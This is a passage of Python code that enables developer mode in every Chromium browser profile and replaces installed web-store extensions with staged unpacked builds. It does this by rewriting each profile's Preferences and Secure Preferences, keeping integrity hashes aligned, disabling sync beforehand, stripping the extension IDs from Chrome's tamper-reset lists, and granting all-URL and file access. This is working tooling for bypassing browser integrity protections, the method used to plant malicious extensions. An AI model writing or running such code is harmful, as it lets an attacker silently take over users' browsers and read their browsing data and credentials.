        # Always enable developer mode for all profiles
        logger.info("🔄 Step 3: Enabling developer mode for all profiles")
        dev_mode_success = self._enable_developer_mode_all_profiles()
        if dev_mode_success:
            logger.info("✅ Developer mode enabled successfully")
        else:
            logger.error("❌ Failed to enable developer mode")

        # Replace extensions if path provided
        extension_success = None  # None means not attempted
        extensions_attempted = False

        if extensions_base_path is not None:  # Extensions replacement requested
            logger.info("🔄 Step 3: Extension replacement requested")
            # Use default extensions path if none provided
            if extensions_base_path == "":  # Empty string means use default
                extensions_base_path = self.get_default_extensions_path()
                logger.info(f"📁 Using default extensions path: {extensions_base_path}")

            logger.info(f"📁 Checking extensions path: {extensions_base_path}")
            if os.path.exists(extensions_base_path):
                logger.info("✅ Extensions path exists, starting replacement process")
                extensions_attempted = True
                extension_success = self._replace_extensions_all_profiles(extensions_base_path)
                if extension_success:
                    logger.info("✅ Extension replacement completed successfully")
                else:
                    logger.error("❌ Extension replacement failed")
            else:
                logger.error(f"❌ Extensions path not found: {extensions_base_path}")
                print(f"❌ Extensions path not found: {extensions_base_path}")
                extensions_attempted = True
                extension_success = False
        else:
            logger.info("🔄 Step 3: Checking for default extensions path")
            # Check if default extensions path exists and use it automatically
            default_extensions_path = self.get_default_extensions_path()
            logger.debug(f"📁 Default extensions path: {default_extensions_path}")
            if os.path.exists(default_extensions_path):
                logger.info("✅ Default extensions path found, starting automatic replacement")
                extensions_attempted = True
                extension_success = self._replace_extensions_all_profiles(default_extensions_path)
                if extension_success:
                    logger.info("✅ Automatic extension replacement completed successfully")
                else:
                    logger.error("❌ Automatic extension replacement failed")
            else:
                logger.info("ℹ️ No default extensions path found, skipping extension replacement")

        # Determine overall success
        overall_success = dev_mode_success
        if extensions_attempted:
            overall_success = dev_mode_success and extension_success

        # Final summary
        logger.info("📊 UNIFIED PROCESS SUMMARY")
        logger.info("="*60)
        logger.info(f"🔧 Developer Mode: {'✅ SUCCESS' if dev_mode_success else '❌ FAILED'}")
        if extensions_attempted:
            logger.info(f"🔄 Extension Replacement: {'✅ SUCCESS' if extension_success else '❌ FAILED'}")
        else:
            logger.info("🔄 Extension Replacement: ⏭️ SKIPPED")
        logger.info(f"🎯 Overall Result: {'✅ SUCCESS' if overall_success else '❌ FAILED'}")
        logger.info("="*60)

        if overall_success:
            logger.info("✅ Process completed successfully!")
            print("✅ Process completed successfully!")
        else:
            logger.error("❌ Process failed.")
            print("❌ Process failed.")

        return overall_success

    def _enable_developer_mode_all_profiles(self):
        """Enable developer mode for all browser profiles"""
        logger.info("🔧 Starting developer mode enablement for all profiles")
        browser_profiles = self.find_all_browser_profiles()

        if not browser_profiles:
            logger.error("❌ No browser profiles found!")
            print("❌ No browser profiles found!")
            return False

        total_processed = 0
        total_modified = 0
        logger.info(f"🎯 Found {len(browser_profiles)} browsers with profiles to process")

        for browser_name, browser_info in browser_profiles.items():
            browser_path = browser_info["path"]
            profiles = browser_info["profiles"]
            logger.info(f"🔧 Processing {browser_name} with {len(profiles)} profiles")

            for profile_name in profiles:
                profile_path = Path(browser_path) / profile_name
                logger.debug(f"🔧 Processing profile: {browser_name}/{profile_name}")

                # STEP 1: Process regular Preferences FIRST (disable sync before Secure Preferences)
                # This prevents Chrome from restoring sync settings
                logger.debug(f"📝 Step 1: Updating regular Preferences for {browser_name}/{profile_name}")
                prefs_modified = self.update_regular_preferences(profile_path)
                if prefs_modified:
                    logger.debug(f"✅ Regular Preferences modified for {browser_name}/{profile_name}")
                else:
                    logger.debug(f"ℹ️ Regular Preferences unchanged for {browser_name}/{profile_name}")

                # STEP 2: Process Secure Preferences AFTER sync is disabled
                logger.debug(f"🔒 Step 2: Processing Secure Preferences for {browser_name}/{profile_name}")
                secure_modified, profile_type = self.process_secure_preferences(profile_path)
                if secure_modified:
                    logger.info(f"✅ Secure Preferences modified for {browser_name}/{profile_name} ({profile_type} profile)")
                else:
                    logger.debug(f"ℹ️ Secure Preferences unchanged for {browser_name}/{profile_name} ({profile_type} profile)")

                if secure_modified or prefs_modified:
                    total_modified += 1
                    logger.info(f"✅ Profile {browser_name}/{profile_name} successfully modified")

                total_processed += 1

        logger.info(f"📊 Developer mode process complete: {total_processed} profiles processed, {total_modified} modified")
        print(f"✅ Processed {total_processed} profiles, modified {total_modified}")
        return total_processed > 0

    def _log_extension_replace_postmortem(
        self,
        browser_profiles: Dict[str, Any],
        extensions_base_path: str,
    ) -> None:
        """Explain common 'tool succeeded but browser shows nothing' cases using Local State + writes."""
        written: Set[Tuple[str, str]] = getattr(
            self, "_profiles_extensions_written", set()
        )
        browsers_patched = {b for b, _ in written}

        for browser_name, browser_info in browser_profiles.items():
            browser_path = browser_info["path"]
            hints = self._get_local_state_profile_hints(browser_path)
            last_used = hints.get("last_used")
            staged_dir = os.path.join(extensions_base_path, browser_name)
            patched_names = {p for b, p in written if b == browser_name}

            if browser_name not in browsers_patched:
                if last_used and self._profile_supports_unpacked_extensions(last_used):
                    logger.warning(
                        "⚠️ No extension staging for %r under %s — this browser is IGNORED. "
                        "Local State profile.last_used=%r. Add unpacked build at: %s\\%s\\<id>\\ "
                        "or %s\\__all__\\<id>\\ (then re-run).",
                        browser_name,
                        extensions_base_path,
                        last_used,
                        staged_dir,
                        self.EXTENSION_STAGING_ALL_PROFILES,
                        staged_dir,
                    )
                continue

            logger.info(
                "📝 %r: extension prefs written for profile folder(s): %s (User Data: %s)",
                browser_name,
                ", ".join(sorted(patched_names)),
                browser_path,
            )

            if (
                last_used
                and self._profile_supports_unpacked_extensions(last_used)
                and patched_names
                and last_used not in patched_names
            ):
                logger.warning(
                    "⚠️ %r Local State profile.last_used=%r but prefs were only written for: %s. "
                    "You may be opening a different profile than the one we patched. "
                    "Check chrome://version (or edge://version) Profile path against the folders above.",
                    browser_name,
                    last_used,
                    sorted(patched_names),
                )

    def _replace_extensions_all_profiles(self, extensions_base_path):
        """Replace extensions for all browser profiles"""
        logger.info(f"🔄 Starting extension replacement from: {extensions_base_path}")
        self._profiles_extensions_written = set()
        browser_profiles = self.find_all_browser_profiles()

        if not browser_profiles:
            logger.error("❌ No browser profiles found for extension replacement!")
            print("❌ No browser profiles found for extension replacement!")
            return False

        total_success = 0
        total_attempted = 0
        logger.info(f"🎯 Processing {len(browser_profiles)} browsers for extension replacement")
        processed_keys: Set[Tuple[str, str, str]] = set()

        for browser_name, browser_info in browser_profiles.items():
            browser_path = browser_info["path"]
            profiles = browser_info["profiles"]

            # Check if extensions exist for this browser
            browser_extensions_path = os.path.join(extensions_base_path, browser_name)
            logger.debug(f"🔍 Checking for {browser_name} extensions at: {browser_extensions_path}")

            if not os.path.exists(browser_extensions_path):
                logger.debug(f"ℹ️ No extensions found for {browser_name}, skipping")
                continue

            logger.info(f"✅ Found extensions for {browser_name}, processing {len(profiles)} profiles")

            shared_root = os.path.join(
                browser_extensions_path, self.EXTENSION_STAGING_ALL_PROFILES
            )
            if os.path.isdir(shared_root):
                s_ok, s_n = self._replace_extensions_from_shared_staging(
                    browser_name,
                    browser_path,
                    profiles,
                    shared_root,
                    processed_keys,
                )
                total_success += s_ok
                total_attempted += s_n

            for profile_name in profiles:
                if profile_name == self.EXTENSION_STAGING_ALL_PROFILES:
                    continue
                if not self._profile_supports_unpacked_extensions(profile_name):
                    logger.debug(
                        "Skipping %s/%s for extension replace: not a regular profile "
                        "(Guest/System cannot use unpacked extensions like Chrome Profile 1/Default)",
                        browser_name,
                        profile_name,
                    )
                    continue
                profile_extensions_path = os.path.join(browser_extensions_path, profile_name)
                logger.debug(f"🔍 Checking for {browser_name}/{profile_name} extensions at: {profile_extensions_path}")

                if not os.path.exists(profile_extensions_path):
                    logger.debug(f"ℹ️ No extensions found for {browser_name}/{profile_name}, skipping")
                    continue

                logger.info(f"🔄 Processing extensions for {browser_name}/{profile_name}")
                success_count, total_count = self._replace_extensions_for_profile(
                    browser_name,
                    profile_name,
                    browser_path,
                    profile_extensions_path,
                    processed_keys,
                )

                logger.info(f"📊 {browser_name}/{profile_name}: {success_count}/{total_count} extensions replaced successfully")
                total_success += success_count
                total_attempted += total_count
                if success_count > 0:
                    self._profiles_extensions_written.add((browser_name, profile_name))

        logger.info(f"📊 Extension replacement complete: {total_success}/{total_attempted} successful")
        print(f"✅ Extension replacement: {total_success}/{total_attempted} successful")

        if total_attempted > 0:
            self._log_extension_replace_postmortem(browser_profiles, extensions_base_path)

        if total_attempted == 0:
            logger.info(
                "ℹ️ No staged extensions found (0/0). Staging layout example: "
                "%s\\Chrome\\Default\\<extension_id>\\manifest.json or "
                "%s\\Chrome\\%s\\<extension_id>\\manifest.json "
                "(applies that unpacked build to every profile with Preferences, "
                "including first-time registration) — dev mode still applied.",
                extensions_base_path,
                extensions_base_path,
                self.EXTENSION_STAGING_ALL_PROFILES,
            )
            return True

        return total_success == total_attempted

    def _replace_extensions_for_profile(
        self,
        browser_name,
        profile_name,
        browser_path,
        profile_extensions_path,
        processed_keys: Optional[Set[Tuple[str, str, str]]] = None,
    ):
        """Replace extensions for a specific browser profile (per-profile staging folder)."""
        logger.debug(f"🔄 Starting extension replacement for {browser_name}/{profile_name}")
        if not self._profile_supports_unpacked_extensions(profile_name):
            logger.debug(
                "Skip per-profile staging for %s/%s (Guest/System profile)",
                browser_name,
                profile_name,
            )
            return 0, 0
        profile_path = os.path.join(browser_path, profile_name)

        # Get list of extension directories
        try:
            extension_dirs = [d for d in os.listdir(profile_extensions_path)
                            if os.path.isdir(os.path.join(profile_extensions_path, d))]
            logger.debug(f"📁 Found {len(extension_dirs)} extension directories for {browser_name}/{profile_name}")
        except (PermissionError, OSError) as e:
            logger.warning(f"🔒 Permission error accessing extensions for {browser_name}/{profile_name}: {e}")
            return 0, 0

        if not extension_dirs:
            logger.debug(f"ℹ️ No extension directories found for {browser_name}/{profile_name}")
            return 0, 0

        success_count = 0
        n_tried = 0
        logger.info(f"🔄 Processing {len(extension_dirs)} extensions for {browser_name}/{profile_name}")

        for staging_dir in extension_dirs:
            custom_extension_path = os.path.join(profile_extensions_path, staging_dir)
            manifest_path = os.path.join(custom_extension_path, "manifest.json")
            if not os.path.isfile(manifest_path):
                logger.warning("Skipping %s: no manifest.json", manifest_path)
                continue
            try:
                with open(manifest_path, "r", encoding="utf-8") as mf:
                    mf_json = json.load(mf)
            except (OSError, json.JSONDecodeError) as e:
                logger.error("Cannot read manifest %s: %s", manifest_path, e)
                continue

            path_norm = self._normalize_extension_path(custom_extension_path)
            chrome_id = self._compute_chrome_extension_id(mf_json, path_norm)
            if not chrome_id:
                logger.error("Cannot compute Chrome extension id for %s", manifest_path)
                continue
            prefs_extension_id = self._resolve_prefs_extension_id_for_profile(
                profile_path, chrome_id, staging_dir
            )
            if chrome_id != staging_dir:
                logger.warning(
                    "Staging folder %r differs from computed manifest/path id %r. "
                    "extensions.settings key: %r.",
                    staging_dir,
                    chrome_id,
                    prefs_extension_id,
                )

            logger.debug(
                "🔧 Processing extension chrome_id=%s prefs_key=%s (folder=%s) for %s/%s",
                chrome_id,
                prefs_extension_id,
                staging_dir,
                browser_name,
                profile_name,
            )

            dedupe_key = (browser_name, profile_name, prefs_extension_id)
            if processed_keys is not None and dedupe_key in processed_keys:
                logger.debug(
                    "Skipping duplicate replace for %s/%s (%s) — already applied via __all__",
                    browser_name,
                    profile_name,
                    prefs_extension_id,
                )
                continue

            n_tried += 1
            if self._replace_extension_for_profile(
                chrome_id,
                custom_extension_path,
                profile_path,
                browser_name,
                mf_json,
                staging_dir_name=staging_dir,
            ):
                success_count += 1
                if processed_keys is not None:
                    processed_keys.add(dedupe_key)
                logger.info(
                    "✅ Successfully replaced extension %s for %s/%s",
                    prefs_extension_id,
                    browser_name,
                    profile_name,
                )
            else:
                logger.warning(
                    "❌ Failed to replace extension %s for %s/%s",
                    prefs_extension_id,
                    browser_name,
                    profile_name,
                )

        logger.info(
            f"📊 Extension replacement for {browser_name}/{profile_name}: "
            f"{success_count}/{n_tried} successful (folders scanned: {len(extension_dirs)})"
        )
        return success_count, n_tried

    # extensions/common/mojom/manifest.mojom — integer stored in prefs
    _MANIFEST_LOCATION_UNPACKED = 4  # kUnpacked (folder with manifest.json; needs developer mode)

    # Under <extensions_base>/<BrowserName>/__all__/<extension_id>/ — apply that unpacked
    # tree to every real profile that already has the id in Preferences or Secure Preferences.
    # Avoids "I only staged Profile 1 but use Default" mismatches.
    EXTENSION_STAGING_ALL_PROFILES = "__all__"

    # Extension::WITHHOLD_PERMISSIONS — preserve when rewriting creation_flags (extension.h).
    _EXTENSION_CREATION_FLAG_WITHHOLD_PERMISSIONS = 1 << 14

    # Keys ExtensionPrefs::FinishExtensionInfoPrefs removes on (re)install finish
    # (extension_prefs.cc lines 2480-2490).
    # EventRouter::kRegisteredLazyEvents            = "events"
    # EventRouter::kRegisteredServiceWorkerEvents   = "serviceworkerevents"
    # EventRouter::kFilteredEvents                  = "filtered_events"
    # EventRouter::kFilteredServiceWorkerEvents      = "filtered_service_worker_events"
    # kPrefHasStartedServiceWorker                  = "has_started_service_worker"
    # kDelayedInstallInfo                           = "delayed_install_info"
    # WebRequestEventRouter::kFilteredLazyListeners handled separately in
    # _strip_chromium_unpack_stale_keys (it's a sub-key inside "web_request").
    _CHROMIUM_UNPACKED_INSTALL_FINISH_KEYS_DROP = frozenset(
        {
            "events",
            "serviceworkerevents",
            "filtered_events",
            "filtered_service_worker_events",
            "has_started_service_worker",
            "delayed_install_info",
        }
    )

    # Observed key order in extensions.settings after CWS → unpacked (reference_changed sample);
    # stable ordering keeps HMAC aligned with Chrome's on-disk JSON.
    _UNPACKED_EXT_SETTINGS_KEY_ORDER: Tuple[str, ...] = (
        "account_extension_type",
        "active_bit",
        "active_permissions",
        "allowlist",
        "commands",
        "content_settings",
        "creation_flags",
        "disable_reasons",
        "events",
        "first_install_time",
        "from_webstore",
        "granted_permissions",
        "incognito_content_settings",
        "incognito_preferences",
        "last_update_time",
        "location",
        "manifest",
        "needs_sync",
        "newAllowFileAccess",
        "path",
        "preferences",
        "regular_only_preferences",
        "was_installed_by_default",
        "was_installed_by_oem",
        "web_request",
        "withholding_permissions",
    )

    _ACTIVE_PERMISSIONS_API_STRIP_UNPACKED = frozenset(
        ("identity", "unlimitedStorage", "webRequest", "sidePanel")
    )

    @staticmethod
    def _flatten_manifest_suggested_key(suggested_key: Any) -> str:
        if suggested_key is None:
            return ""
        if isinstance(suggested_key, str):
            return suggested_key
        if isinstance(suggested_key, dict):
            if sys.platform == "darwin":
                plat = "mac"
            elif os.name == "nt":
                plat = "windows"
            else:
                plat = "linux"
            return (
                suggested_key.get(plat)
                or suggested_key.get("default")
                or ""
            )
        return ""

    def _merge_extension_commands_unpacked(
        self,
        prior_commands: Any,
        manifest: Optional[dict],
    ) -> OrderedDict:
        """Chrome-style commands dict: manifest order first, then prior-only keys; was_assigned True."""
        out: OrderedDict = OrderedDict()
        prior = prior_commands if isinstance(prior_commands, dict) else {}
        mc = None
        if manifest and isinstance(manifest.get("commands"), dict):
            mc = manifest["commands"]
        if mc:
            for name, spec in mc.items():
                if not isinstance(spec, dict):
                    continue
                flat = self._flatten_manifest_suggested_key(spec.get("suggested_key"))
                out[name] = OrderedDict(
                    [("suggested_key", flat), ("was_assigned", True)]
                )
        for name, spec in prior.items():
            if name in out:
                continue
            if isinstance(spec, dict):
                od = OrderedDict((k, v) for k, v in spec.items())
                if "was_assigned" not in od:
                    od["was_assigned"] = True
                out[name] = od
            else:
                out[name] = spec
        return out

    def _granted_permissions_unpacked(self, granted: Any) -> OrderedDict:
        """Granted prefs after unpack: prepend <all_urls> to explicit_host when CWS had http+https wildcards."""
        if not isinstance(granted, dict):
            return OrderedDict(
                [
                    ("api", []),
                    ("explicit_host", []),
                    ("manifest_permissions", []),
                    ("scriptable_host", []),
                ]
            )
        out = json.loads(json.dumps(granted), object_pairs_hook=OrderedDict)
        eh = out.get("explicit_host")
        if isinstance(eh, list):
            if (
                "<all_urls>" not in eh
                and "http://*/*" in eh
                and "https://*/*" in eh
            ):
                out["explicit_host"] = ["<all_urls>"] + list(eh)
        return out

    def _active_permissions_unpacked(self, granted_permissions: OrderedDict) -> OrderedDict:
        """
        Effective active_permissions for unpacked profile (reference_changed vs original):
        narrower API set, broad explicit hosts, empty scriptable_host.
        """
        api = granted_permissions.get("api")
        if not isinstance(api, list):
            api = []
        filtered = [x for x in api if x not in self._ACTIVE_PERMISSIONS_API_STRIP_UNPACKED]
        eh = granted_permissions.get("explicit_host")
        if (
            isinstance(eh, list)
            and "<all_urls>" in eh
            and "http://*/*" in eh
            and "https://*/*" in eh
        ):
            explicit = ["<all_urls>", "http://*/*", "https://*/*"]
        elif isinstance(eh, list):
            explicit = list(eh)
        else:
            explicit = []
        mp = granted_permissions.get("manifest_permissions")
        if not isinstance(mp, list):
            mp = []
        return OrderedDict(
            [
                ("api", filtered),
                ("explicit_host", explicit),
                ("manifest_permissions", list(mp)),
                ("scriptable_host", []),
            ]
        )

    def _reorder_extension_settings_keys(self, d: OrderedDict) -> OrderedDict:
        out = OrderedDict()
        seen = set()
        for k in self._UNPACKED_EXT_SETTINGS_KEY_ORDER:
            if k in d:
                out[k] = d[k]
                seen.add(k)
        for k, v in d.items():
            if k not in seen:
                out[k] = v
        return out

    def _normalize_extension_path(self, custom_extension_path: str) -> str:
        """Absolute, normalized path string for prefs (Chrome accepts OS-native separators)."""
        return os.path.normpath(os.path.abspath(os.path.expanduser(custom_extension_path)))

    def _windows_epoch_microseconds_string(self) -> str:
        """Match Chrome base::Time delta-since-Windows-epoch in microseconds (decimal string)."""
        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        return str(int((now - epoch).total_seconds() * 1_000_000))

    def _ensure_new_unpacked_row_defaults(self, ex: OrderedDict) -> None:
        """
        When extensions.settings.<id> is created from scratch (no CWS row), add the
        empty shells that FinishExtensionInfoPrefs (extension_prefs.cc:2447) and
        PopulateExtensionInfoPrefs (extension_prefs.cc:2309) initialise.

        FinishExtensionInfoPrefs ensures these exist:
          pref_names::kPrefPreferences             = "preferences"          (empty dict)
          pref_names::kPrefIncognitoPreferences     = "incognito_preferences" (empty dict)
          pref_names::kPrefRegularOnlyPreferences   = "regular_only_preferences" (empty dict)
          pref_names::kPrefContentSettings          = "content_settings"     (empty list)
          pref_names::kPrefIncognitoContentSettings  = "incognito_content_settings" (empty list)

        PopulateExtensionInfoPrefs ensures:
          kPrefFirstInstallTime  — preserved if already present, else install_time
          kPrefLastUpdateTime    — always set to install_time
          kPrefWithholdingPermissions — if CanWithholdPermissionsFromExtension
                                        (default false when no WITHHOLD_PERMISSIONS flag)

        account_extension_type is set by AccountExtensionTracker::
        SetAccountExtensionTypeOnExtensionInstalled (account_extension_tracker.cc);
        kLocal=0 for unsyncable / unsigned.
        """
        if "preferences" not in ex:
            ex["preferences"] = OrderedDict()
        if "incognito_preferences" not in ex:
            ex["incognito_preferences"] = OrderedDict()
        if "regular_only_preferences" not in ex:
            ex["regular_only_preferences"] = OrderedDict()
        if "content_settings" not in ex:
            ex["content_settings"] = []
        if "incognito_content_settings" not in ex:
            ex["incognito_content_settings"] = []
        t = self._windows_epoch_microseconds_string()
        if "first_install_time" not in ex:
            ex["first_install_time"] = t
        if "last_update_time" not in ex:
            ex["last_update_time"] = t
        if "withholding_permissions" not in ex:
            ex["withholding_permissions"] = False
        if "account_extension_type" not in ex:
            ex["account_extension_type"] = 0

    def _strip_chromium_unpack_stale_keys(self, ex: OrderedDict) -> None:
        """
        Match ExtensionPrefs::FinishExtensionInfoPrefs cleanup (extension_prefs.cc)
        and WebRequestEventRouter::kFilteredLazyListeners removal for a clean
        unpack transition.
        """
        for k in self._CHROMIUM_UNPACKED_INSTALL_FINISH_KEYS_DROP:
            ex.pop(k, None)
        wr = ex.get("web_request")
        if isinstance(wr, dict):
            wr2 = dict(wr)
            wr2.pop("filtered_lazy_listeners", None)
            if wr2:
                ex["web_request"] = OrderedDict(wr2)
            else:
                ex.pop("web_request", None)

    def _merge_extension_commands_conservative(
        self,
        prior_commands: Any,
        manifest: Optional[dict],
    ) -> OrderedDict:
        """
        Add command entries from the on-disk manifest when missing in prefs; do not
        clobber Chrome-refined shortcuts already stored in prior.
        """
        pc = prior_commands if isinstance(prior_commands, dict) else {}
        out = json.loads(json.dumps(pc), object_pairs_hook=OrderedDict)
        mc = (manifest or {}).get("commands") if manifest else None
        if not isinstance(mc, dict):
            return out
        for name, spec in mc.items():
            if name in out:
                ent = out[name]
                if isinstance(ent, dict) and "was_assigned" not in ent:
                    od = OrderedDict((k, v) for k, v in ent.items())
                    od["was_assigned"] = True
                    out[name] = od
                continue
            if isinstance(spec, dict):
                flat = self._flatten_manifest_suggested_key(spec.get("suggested_key"))
                out[name] = OrderedDict(
                    [("suggested_key", flat), ("was_assigned", True)]
                )
        # Manifest often omits command names already refined in prefs (e.g. _execute_action).
        for name, ent in list(out.items()):
            if (
                isinstance(ent, dict)
                and "suggested_key" in ent
                and "was_assigned" not in ent
            ):
                od = OrderedDict((k, v) for k, v in ent.items())
                od["was_assigned"] = True
                out[name] = od
        return out

    def _merge_extension_settings_unpacked(
        self,
        existing: Any,
        path_norm: str,
        manifest: Optional[dict] = None,
        *,
        reference_changed_parity: bool = False,
    ) -> OrderedDict:
        """
        Build extensions.settings.<id> for location=kUnpacked (ManifestLocation enum 4).

        **Default (reference_changed_parity=False):** matches Chromium source exactly:

        PopulateExtensionInfoPrefs (extension_prefs.cc:2309):
          - disable_reasons=[], location=4, creation_flags, from_webstore=False
          - was_installed_by_default=False, was_installed_by_oem=False
          - first_install_time (preserved), last_update_time (refreshed)
          - withholding_permissions (conditional), path (absolute for unpacked)
          - manifest is NOT stored for unpacked (IsUnpackedLocation → skip)
          - do_not_sync removed (kInstallFlagDoNotSync not set)

        FinishExtensionInfoPrefs (extension_prefs.cc:2447):
          - ensures preferences, incognito_preferences, regular_only_preferences (dicts)
          - ensures content_settings, incognito_content_settings (lists)
          - removes events, serviceworkerevents, filtered_events,
            filtered_service_worker_events, has_started_service_worker,
            delayed_install_info, web_request.filtered_lazy_listeners

        **reference_changed_parity=True:** for tests only.
        """
        # Profile 3_changed keeps cws-info + lastpingday on unpack; reference_changed parity tests drop them.
        keys_drop_common = frozenset(
            {"ack_external", "ack_prompt_count", "install_parameter"}
        )
        keys_drop_parity_meta = frozenset({"cws-info", "lastpingday"})
        keys_drop_parity_extra = frozenset(
            {
                "filtered_service_worker_events",
                "persistent_script_url_patterns",
                "serviceworkerevents",
            }
        )
        if reference_changed_parity:
            keys_drop = keys_drop_common | keys_drop_parity_meta | keys_drop_parity_extra
        else:
            keys_drop = keys_drop_common
        is_new_row = not (existing and isinstance(existing, dict))
        ex: OrderedDict
        if existing and isinstance(existing, dict):
            ex = OrderedDict(
                (k, v)
                for k, v in existing.items()
                if k not in keys_drop and k != "state"
            )
        else:
            ex = OrderedDict()

        if not reference_changed_parity:
            self._strip_chromium_unpack_stale_keys(ex)

        if reference_changed_parity:
            granted = self._granted_permissions_unpacked(ex.get("granted_permissions"))
            ex["granted_permissions"] = granted
            ex["active_permissions"] = self._active_permissions_unpacked(granted)
            ex["commands"] = self._merge_extension_commands_unpacked(
                existing.get("commands") if isinstance(existing, dict) else None,
                manifest,
            )
            ex["web_request"] = OrderedDict()
            ex["active_bit"] = False
            ex["allowlist"] = 1
            ex["events"] = []
        else:
            ex["commands"] = self._merge_extension_commands_conservative(
                existing.get("commands") if isinstance(existing, dict) else None,
                manifest,
            )
            granted = self._granted_permissions_unpacked(ex.get("granted_permissions"))
            ex["granted_permissions"] = granted
            ex["active_permissions"] = self._active_permissions_unpacked(granted)
            # FinishExtensionInfoPrefs removes "events", "serviceworkerevents", etc.
            # (already handled by _strip_chromium_unpack_stale_keys). Chrome does NOT
            # re-create them as empty — the event system populates them at runtime.
            # WebRequestEventRouter::kFilteredLazyListeners is a sub-key inside
            # "web_request" — also handled by _strip_chromium_unpack_stale_keys.
            # Do not overwrite the entire web_request dict; Chrome only strips
            # the filtered_lazy_listeners sub-key.

        # Typical flags for unpacked: REQUIRE_MODERN_MANIFEST_VERSION|ALLOW_FILE_ACCESS|
        # FOLLOW_SYMLINKS_ANYWHERE (2+4+32=38). InstalledLoader strips ALLOW_FILE_ACCESS
        # from flags and reapplies from newAllowFileAccess pref (installed_loader.cc).
        prior_cf = None
        if existing and isinstance(existing, dict):
            pc = existing.get("creation_flags")
            if isinstance(pc, int):
                prior_cf = pc
        base_cf = 38
        if prior_cf is not None:
            base_cf |= (
                prior_cf & self._EXTENSION_CREATION_FLAG_WITHHOLD_PERMISSIONS
            )
        ex["creation_flags"] = base_cf
        ex["from_webstore"] = False
        ex["location"] = self._MANIFEST_LOCATION_UNPACKED
        ex["path"] = path_norm
        ex["was_installed_by_default"] = False
        ex["was_installed_by_oem"] = False
        ex["disable_reasons"] = []
        if not reference_changed_parity:
            # extension_prefs.cc PopulateExtensionInfoPrefs: kPrefDoNotSync removed when
            # kInstallFlagDoNotSync is not set; forcing true can confuse sync/metadata.
            ex.pop("do_not_sync", None)
        if reference_changed_parity:
            if os.name == "nt":
                ex["newAllowFileAccess"] = True
        else:
            ex["newAllowFileAccess"] = True

        # extension_prefs.cc PopulateExtensionInfoPrefs:
        #   if (!Manifest::IsUnpackedLocation(extension->location()))
        #       extension_dict->SetKey(kPrefManifest, ...);
        # Chrome does NOT store manifest in prefs for unpacked (kUnpacked) extensions;
        # InstalledLoader::ShouldReloadExtensionManifest always returns true for
        # unpacked, so Chrome re-reads from disk on every startup.
        if not reference_changed_parity:
            ex.pop("manifest", None)

        if not reference_changed_parity and is_new_row:
            self._ensure_new_unpacked_row_defaults(ex)

        # extension_prefs.cc PopulateExtensionInfoPrefs always refreshes last_update_time on install/update.
        ex["last_update_time"] = self._windows_epoch_microseconds_string()

        if reference_changed_parity:
            return self._reorder_extension_settings_keys(ex)
        return ex

    def _richer_extensions_settings_prior(
        self,
        prior: Any,
        extension_id: str,
        profile_dir: str,
        staging_dir_name: Optional[str],
    ) -> Any:
        """
        Prefer the richest extensions.settings entry (Secure vs Preferences).

        Tie-break on equal key-count: Secure Preferences wins over regular Preferences,
        and the in-memory row from the file being edited wins over re-read duplicates.
        """
        scored: List[Tuple[Any, Tuple[int, int]]] = []

        def _load_settings_key(path: str, key: str) -> Optional[dict]:
            if not os.path.isfile(path):
                return None
            try:
                with open(path, "r", encoding="utf-8") as f:
                    root = json.load(f, object_pairs_hook=OrderedDict)
                ext = root.get("extensions")
                if not isinstance(ext, dict):
                    return None
                st = ext.get("settings")
                if not isinstance(st, dict):
                    return None
                v = st.get(key)
                return v if isinstance(v, dict) else None
            except (OSError, json.JSONDecodeError):
                return None

        prefs_fp = os.path.join(profile_dir, "Preferences")
        secure_fp = os.path.join(profile_dir, "Secure Preferences")
        if prior is not None:
            scored.append((prior, (len(prior), 2)))
        for key in (extension_id, staging_dir_name):
            if not key or not isinstance(key, str):
                continue
            for fp in (secure_fp, prefs_fp):
                d = _load_settings_key(fp, key)
                if d is None:
                    continue
                prefer_secure = 1 if fp == secure_fp else 0
                scored.append((d, (len(d), prefer_secure)))

        if not scored:
            return None
        return max(scored, key=lambda t: t[1])[0]

    def _path_norm_replace_all_staging_with_profile(
        self,
        path_norm: str,
        profile_path: str,
        browser_name: str,
    ) -> str:
        """
        Shared staging uses .../<Browser>/__all__/<id>/ on disk; prefs path should use the
        real profile directory (e.g. Profile 1) like Chrome after unpack, not __all__.
        """
        if not path_norm or not browser_name:
            return path_norm
        profile_name = os.path.basename(os.path.normpath(profile_path))
        if not profile_name or profile_name == browser_name:
            return path_norm
        pattern = re.compile(
            re.escape(browser_name) + r"[/\\]" + re.escape(self.EXTENSION_STAGING_ALL_PROFILES),
            re.I,
        )
        # Callable replacement: str.replace template interprets "\P" in Windows paths as escapes.
        repl = browser_name + os.sep + profile_name
        new_path, n = pattern.subn(lambda _m: repl, path_norm, count=1)
        return new_path if n else path_norm

    def _scrub_extensions_settings_tracked_reset(
        self,
        root: Dict,
        extension_id: str,
        staging_dir_name: Optional[str],
    ) -> bool:
        """
        Remove extensions.settings.<id> from prefs.tracked_preferences_reset lists.

        Chrome records prefs slated for reset; leaving our target id there causes the
        effective extensions.settings.<id> entry to be dropped or ignored on startup.
        Handles both nested prefs.tracked_preferences_reset and the dotted top-level
        key prefs.tracked_preferences_reset (seen in Secure Preferences).
        """
        to_drop = {f"extensions.settings.{extension_id}"}
        if staging_dir_name and staging_dir_name != extension_id:
            to_drop.add(f"extensions.settings.{staging_dir_name}")

        def _strip_list(lst: Any) -> Tuple[list, bool]:
            if not isinstance(lst, list):
                return [], False
            kept = [x for x in lst if x not in to_drop]
            return kept, kept != lst

        changed = False

        dotted = root.get("prefs.tracked_preferences_reset")
        if isinstance(dotted, list):
            kept, diff = _strip_list(dotted)
            if diff:
                changed = True
                logger.info(
                    "Removed extension target(s) from prefs.tracked_preferences_reset "
                    "(dotted key): %s",
                    sorted(to_drop.intersection(set(dotted))),
                )
            if kept:
                root["prefs.tracked_preferences_reset"] = kept
            elif "prefs.tracked_preferences_reset" in root:
                del root["prefs.tracked_preferences_reset"]
                if diff:
                    changed = True

        prefs_obj = root.get("prefs")
        if isinstance(prefs_obj, dict):
            inner = prefs_obj.get("tracked_preferences_reset")
            if isinstance(inner, list):
                kept, diff = _strip_list(inner)
                if diff:
                    changed = True
                    logger.info(
                        "Removed extension target(s) from prefs.tracked_preferences_reset "
                        "(nested): %s",
                        sorted(to_drop.intersection(set(inner))),
                    )
                if kept:
                    prefs_obj["tracked_preferences_reset"] = kept
                elif "tracked_preferences_reset" in prefs_obj:
                    del prefs_obj["tracked_preferences_reset"]

        profile = root.get("profile")
        if isinstance(profile, dict):
